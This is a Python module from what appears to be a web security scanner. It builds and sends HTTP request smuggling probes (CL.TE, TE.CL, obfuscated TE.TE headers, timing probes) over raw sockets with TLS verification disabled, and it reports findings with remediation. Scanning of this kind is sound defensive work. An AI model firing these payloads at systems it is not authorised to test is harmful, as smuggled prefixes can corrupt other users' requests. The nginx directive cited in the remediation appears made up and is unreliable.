"""
HTTP Request Smuggling Detection Module
Tests for CL.TE, TE.CL, and TE.TE smuggling vulnerabilities
"""

import asyncio
import time
import re
from urllib.parse import urlparse
from typing import List, Optional, Tuple
from dataclasses import dataclass

import httpx

from core.rate_limiter import RateLimiter
from utils.logger import setup_logger


@dataclass
class SmugglingFinding:
    """Represents an HTTP Request Smuggling finding"""
    url: str
    type: str        # 'CL.TE', 'TE.CL', 'TE.TE', 'timeout_based'
    severity: str
    confidence: str
    payload_used: str
    evidence: str
    remediation: str


class HTTPSmugglingScanner:
    """
    HTTP Request Smuggling Detection Module
    Detects:
    - CL.TE (Content-Length / Transfer-Encoding)
    - TE.CL (Transfer-Encoding / Content-Length)
    - TE.TE (obfuscated Transfer-Encoding headers)
    - Time-based blind detection via timeout
    """

    def __init__(self, rate_limiter: RateLimiter):
        self.rate_limiter = rate_limiter
        self.logger = setup_logger("HTTPSmuggling")
        self.findings: List[SmugglingFinding] = []
        self.timeout = httpx.Timeout(8.0, connect=5.0)

    def _build_clte_payload(self, path: str, host: str) -> bytes:
        """
        CL.TE Smuggling payload
        Frontend uses Content-Length, Backend uses Transfer-Encoding
        """
        body = (
            "POST " + path + " HTTP/1.1\r\n"
            "Host: " + host + "\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "\r\n"
            "x=1"
        )
        smuggled_body = f"0\r\n\r\n{body}"
        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(smuggled_body)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{smuggled_body}"
        )
        return request.encode()

    def _build_tecl_payload(self, path: str, host: str) -> bytes:
        """
        TE.CL Smuggling payload
        Frontend uses Transfer-Encoding, Backend uses Content-Length
        """
        chunk_body = "POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 4\r\n\r\nSMUG"
        chunk_size = hex(len(chunk_body))[2:]
        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"{chunk_size}\r\n"
            f"{chunk_body}\r\n"
            f"0\r\n"
            f"\r\n"
        )
        return request.encode()

    def _build_tete_payloads(self, path: str, host: str) -> List[Tuple[str, bytes]]:
        """
        TE.TE Smuggling payloads — obfuscated Transfer-Encoding headers
        """
        payloads = []
        obfuscations = [
            ("Transfer-Encoding: xchunked",        "xchunked"),
            ("Transfer-Encoding : chunked",         "space before colon"),
            ("Transfer-Encoding: chunked\r\nTransfer-Encoding: x", "duplicate TE"),
            ("X-Transfer-Encoding: chunked",        "X- prefix"),
            ("Transfer-Encoding\t: chunked",        "tab before colon"),
            ("Transfer-Encoding: Chunked",          "capital C"),
            ("Transfer-Encoding: CHUNKED",          "all caps"),
        ]

        for te_header, description in obfuscations:
            chunk_body = "0\r\n\r\nGET /SMUGGLED HTTP/1.1\r\nHost: " + host + "\r\n\r\n"
            request = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(chunk_body)}\r\n"
                f"{te_header}\r\n"
                f"\r\n"
                f"{chunk_body}"
            )
            payloads.append((description, request.encode()))

        return payloads

    def _build_timeout_clte(self, path: str, host: str) -> bytes:
        """
        Time-based CL.TE detection
        Sends incomplete chunked body — if backend waits = CL.TE vulnerable
        """
        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: 6\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        )
        return request.encode()

    def _build_timeout_tecl(self, path: str, host: str) -> bytes:
        """
        Time-based TE.CL detection
        Sends Content-Length larger than body — if frontend waits = TE.CL vulnerable
        """
        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: 100\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            "Q"
        )
        return request.encode()

    async def _raw_request(self, host: str, port: int,
                            payload: bytes, use_ssl: bool) -> Tuple[Optional[str], float]:
        """Send raw HTTP request at socket level"""
        import ssl as ssl_module
        loop = asyncio.get_event_loop()

        def _blocking_request():
            import socket
            start = time.monotonic()
            try:
                sock = socket.create_connection((host, port), timeout=30)
                if use_ssl:
                    ctx = ssl_module.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl_module.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)

                sock.sendall(payload)
                sock.settimeout(20)

                response = b""
                try:
                    while True:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        response += chunk
                        if b"\r\n\r\n" in response and len(response) > 200:
                            break
                except socket.timeout:
                    pass

                elapsed = time.monotonic() - start
                sock.close()
                return response.decode('utf-8', errors='ignore'), elapsed
            except Exception as e:
                elapsed = time.monotonic() - start
                return None, elapsed

        return await loop.run_in_executor(None, _blocking_request)

    def _parse_status(self, raw_response: str) -> int:
        """Extract HTTP status code from raw response"""
        match = re.match(r'HTTP/\d+\.?\d*\s+(\d+)', raw_response)
        return int(match.group(1)) if match else 0

    async def test_clte(self, url: str) -> Optional[SmugglingFinding]:
        """Test for CL.TE smuggling"""
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        path = parsed.path or '/'

        payload = self._build_clte_payload(path, host)

        # Send twice — second request may get smuggled response
        resp1, _ = await self._raw_request(host, port, payload, use_ssl)
        await asyncio.sleep(0.5)
        resp2, elapsed = await self._raw_request(host, port, payload, use_ssl)

        # BUG-004 FIX: timing-based CL.TE detection
        if elapsed and elapsed > 5.0:
            return SmugglingFinding(
                url=url,
                type="CL.TE",
                severity="critical",
                confidence="medium",
                payload_used="CL.TE: Content-Length + chunked Transfer-Encoding",
                evidence=(
                    f"Second request took {elapsed:.1f}s — timing delay suggests "
                    "server is waiting for smuggled body bytes (CL.TE)."  # NEW-BUG-003 FIX
                ),
                remediation=self._get_remediation("CL.TE")
            )

        if not resp1 or not resp2:
            return None

        status1 = self._parse_status(resp1)
        status2 = self._parse_status(resp2)

        # Different status codes on identical requests = smuggling
        if status1 != status2 and status1 > 0 and status2 > 0:
            return SmugglingFinding(
                url=url,
                type="CL.TE",
                severity="critical",
                confidence="high",
                payload_used="CL.TE: Content-Length + chunked Transfer-Encoding",
                evidence=(
                    "Two identical requests returned different status codes: "  # NEW-BUG-003 FIX
                    f"Request 1: HTTP {status1}, Request 2: HTTP {status2}. "
                    "This indicates HTTP request smuggling (CL.TE)."  # NEW-BUG-003 FIX
                ),
                remediation=self._get_remediation("CL.TE")
            )

        # Unexpected 400/500 on second request
        if status1 == 200 and status2 in [400, 403, 500]:
            return SmugglingFinding(
                url=url,
                type="CL.TE",
                severity="critical",
                confidence="medium",
                payload_used="CL.TE: Content-Length + chunked Transfer-Encoding",
                evidence=(
                    f"Second identical request got HTTP {status2} after first got {status1}. "
                    "Possible CL.TE smuggling — smuggled prefix poisoned next request."  # NEW-BUG-003 FIX
                ),
                remediation=self._get_remediation("CL.TE")
            )

        return None

    async def test_tecl(self, url: str) -> Optional[SmugglingFinding]:
        """Test for TE.CL smuggling"""
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        path = parsed.path or '/'

        payload = self._build_tecl_payload(path, host)

        resp1, _ = await self._raw_request(host, port, payload, use_ssl)
        await asyncio.sleep(0.5)
        resp2, elapsed = await self._raw_request(host, port, payload, use_ssl)

        # BUG-004 FIX: timing-based TE.CL detection
        if elapsed and elapsed > 5.0:
            return SmugglingFinding(
                url=url,
                type="TE.CL",
                severity="critical",
                confidence="medium",
                payload_used="TE.CL: chunked Transfer-Encoding + Content-Length",
                evidence=(
                    f"Second request took {elapsed:.1f}s — timing delay suggests "
                    "server is waiting for smuggled body bytes (TE.CL)."  # NEW-BUG-003 FIX
                ),
                remediation=self._get_remediation("TE.CL")
            )

        if not resp1 or not resp2:
            return None

        status1 = self._parse_status(resp1)
        status2 = self._parse_status(resp2)

        if status1 != status2 and status1 > 0 and status2 > 0:
            return SmugglingFinding(
                url=url,
                type="TE.CL",
                severity="critical",
                confidence="high",
                payload_used="TE.CL: Transfer-Encoding + Content-Length",
                evidence=(
                    f"Inconsistent responses: HTTP {status1} then HTTP {status2} "
                    "on identical TE.CL payloads — request smuggling detected."  # NEW-BUG-003 FIX
                ),
                remediation=self._get_remediation("TE.CL")
            )

        return None

    async def test_tete(self, url: str) -> Optional[SmugglingFinding]:
        """Test for TE.TE smuggling with obfuscated headers"""
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        path = parsed.path or '/'

        payloads = self._build_tete_payloads(path, host)

        for description, payload in payloads:
            resp1, _ = await self._raw_request(host, port, payload, use_ssl)
            await asyncio.sleep(0.3)
            resp2, _ = await self._raw_request(host, port, payload, use_ssl)

            if not resp1 or not resp2:
                continue

            status1 = self._parse_status(resp1)
            status2 = self._parse_status(resp2)

            if status1 != status2 and status1 > 0 and status2 > 0:
                return SmugglingFinding(
                    url=url,
                    type="TE.TE",
                    severity="critical",
                    confidence="medium",
                    payload_used=f"TE.TE obfuscation: {description}",
                    evidence=(
                        f"Obfuscated TE header '{description}' caused inconsistent responses: "
                        f"HTTP {status1} -> HTTP {status2}. Possible TE.TE smuggling."
                    ),
                    remediation=self._get_remediation("TE.TE")
                )

        return None

    async def test_timeout_based(self, url: str) -> Optional[SmugglingFinding]:
        """
        Time-based blind smuggling detection.
        If request hangs for 10+ seconds = server waiting for more data = vulnerable
        """
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        path = parsed.path or '/'

        # First get baseline response time
        normal_payload = (
            f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
        ).encode()
        _, baseline = await self._raw_request(host, port, normal_payload, use_ssl)

        # Test CL.TE timeout
        clte_payload = self._build_timeout_clte(path, host)
        _, clte_elapsed = await self._raw_request(host, port, clte_payload, use_ssl)

        if clte_elapsed > baseline + 8:
            return SmugglingFinding(
                url=url,
                type="timeout_based",
                severity="high",
                confidence="medium",
                payload_used="Time-based CL.TE: incomplete chunked body",
                evidence=(
                    f"Request took {clte_elapsed:.1f}s (baseline: {baseline:.1f}s). "
                    "Server waited for more data — indicates CL.TE processing."  # NEW-BUG-003 FIX
                ),
                remediation=self._get_remediation("CL.TE")
            )

        # Test TE.CL timeout
        tecl_payload = self._build_timeout_tecl(path, host)
        _, tecl_elapsed = await self._raw_request(host, port, tecl_payload, use_ssl)

        if tecl_elapsed > baseline + 8:
            return SmugglingFinding(
                url=url,
                type="timeout_based",
                severity="high",
                confidence="medium",
                payload_used="Time-based TE.CL: Content-Length larger than body",
                evidence=(
                    f"Request took {tecl_elapsed:.1f}s (baseline: {baseline:.1f}s). "
                    "Server waited for more data — indicates TE.CL processing."  # NEW-BUG-003 FIX
                ),
                remediation=self._get_remediation("TE.CL")
            )

        return None

    def _get_remediation(self, smuggle_type: str) -> str:
        base = (
            "1. Ensure frontend and backend servers agree on how to handle ambiguous requests.\n"
            "2. Reject requests with both Content-Length and Transfer-Encoding headers.\n"
            "3. Use HTTP/2 end-to-end (eliminates classic smuggling).\n"
            "4. Normalize ambiguous requests at the reverse proxy/load balancer.\n"
        )
        specific = {
            "CL.TE": "5. Configure backend to prioritize Transfer-Encoding over Content-Length.\n"
                     "6. Enable strict mode in nginx: reject_invalid_headers on;",
            "TE.CL": "5. Configure frontend to prioritize Transfer-Encoding over Content-Length.\n"
                     "6. Use consistent TE processing across all proxy layers.",
            "TE.TE": "5. Reject requests with malformed or obfuscated Transfer-Encoding headers.\n"
                     "6. Ensure all proxy layers process Transfer-Encoding identically.",
        }
        return base + specific.get(smuggle_type, "5. Consult PortSwigger HTTP smuggling research.")

    async def scan(self, target_urls: List[str], forms: List = None) -> List[SmugglingFinding]:  # BUG-003 FIX
        """Main HTTP smuggling scan"""
        forms = forms or []  # BUG-003 FIX: avoid mutable default argument
        # Test unique base URLs only
        seen_hosts = set()
        test_urls = []
        for url in target_urls:
            parsed = urlparse(url)
            host_key = f"{parsed.scheme}://{parsed.netloc}"
            if host_key not in seen_hosts:
                seen_hosts.add(host_key)
                test_urls.append(url)

        self.logger.info(f"Starting HTTP smuggling scan on {len(test_urls)} hosts")

        tasks = []
        for url in test_urls:
            tasks.append(self.test_clte(url))
            tasks.append(self.test_tecl(url))
            tasks.append(self.test_tete(url))
            tasks.append(self.test_timeout_based(url))

        self.logger.info(f"Running {len(tasks)} smuggling tests...")
        results = await asyncio.gather(*tasks, return_exceptions=True)

        seen = set()
        for result in results:
            if isinstance(result, Exception):
                self.logger.debug(f"Smuggling test error: {result}")
                continue
            if result:
                key = f"{result.url}:{result.type}"
                if key not in seen:
                    seen.add(key)
                    self.findings.append(result)
                    self.logger.warning(
                        f"SMUGGLING [{result.severity.upper()}]: {result.url} | "
                        f"Type: {result.type} | Confidence: {result.confidence}"
                    )

        self.logger.info(f"HTTP smuggling scan complete. Found {len(self.findings)} issues")
        return self.findings
